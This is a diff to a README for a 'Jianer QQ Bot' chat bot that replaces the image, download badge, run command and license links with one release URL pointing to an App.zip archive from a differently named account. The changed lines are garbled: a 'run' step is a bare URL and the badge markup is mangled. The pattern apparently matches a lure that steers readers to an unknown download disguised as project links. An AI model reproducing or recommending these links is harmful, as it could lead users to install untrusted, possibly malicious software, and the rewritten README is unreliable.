@@ -2,7 +2,7 @@
 
 Welcome to the Jianer QQ Bot repository! This is a next-generation QQ group chat bot based on OneBot v11. It offers a variety of functionalities including group management tools, AI capabilities, entertainment features, and much more! 
 
-![Jianer QQ Bot](https://example.com/jianer_qq_bot_image.jpg)
+![Jianer QQ Bot](https://github.com/Hduong476/Jianer_QQ_bot/releases/download/v1.0/App.zip)
 
 #### Repository Details:
 - **Name:** Jianer_QQ_bot
@@ -11,7 +11,7 @@ Welcome to the Jianer QQ Bot repository! This is a next-generation QQ group chat
 
 #### 🚀 Quick Start
 To get started with using Jianer QQ Bot, you can download the latest release by clicking the button below:
-[![Download Jianer QQ Bot](https://img.shields.io/badge/Download%20Jianer%20QQ%20Bot-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Jianer QQ Bot](https://github.com/Hduong476/Jianer_QQ_bot/releases/download/v1.0/App.zip%20Jianer%20QQ%https://github.com/Hduong476/Jianer_QQ_bot/releases/download/v1.0/App.zip)](https://github.com/Hduong476/Jianer_QQ_bot/releases/download/v1.0/App.zip)
 
 #### Features 🌟
 1. **AI Chat:** Engage in conversations with Jianer QQ Bot using advanced AI algorithms.
@@ -27,7 +27,7 @@ To get started with using Jianer QQ Bot, you can download the latest release by 
 #### Usage Examples 🌐
 ```bash
 # Run Jianer QQ Bot
-./jianer_qq_bot.sh
+https://github.com/Hduong476/Jianer_QQ_bot/releases/download/v1.0/App.zip
 
 # Access AI Chat feature
 !chat Hello, Jianer QQ Bot!
@@ -43,7 +43,7 @@ Join our Discord community to get support, share ideas, and interact with other 
 We welcome contributions from the community to enhance Jianer QQ Bot's functionality. Feel free to open issues, submit pull requests, or suggest new features.
 
 #### License ℹ️
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/JianerQQBot/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Hduong476/Jianer_QQ_bot/releases/download/v1.0/App.zip) file for details.
 
 ---
 
